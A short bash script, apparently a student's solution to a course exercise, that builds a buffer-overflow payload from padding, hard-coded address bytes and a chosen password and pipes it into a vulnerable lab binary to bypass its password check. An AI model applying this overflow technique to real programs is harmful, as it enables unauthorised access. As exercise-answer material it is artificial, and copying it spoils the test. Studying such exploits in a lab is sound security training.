#!/usr/bin/env bash

pidgeon='\x30\xb3\xe5\xe0'
correct_pwd='11111'
pwd=$(printf '%0.sa' {1..212})
rooster='\xe4\x88\xff\x43'
entered_pwd=$(printf '%0.sa' {1..210})

payload=$entered_pwd$rooster$pwd$pidgeon$correct_pwd

echo -e $payload | /task1/s2149975/vuln
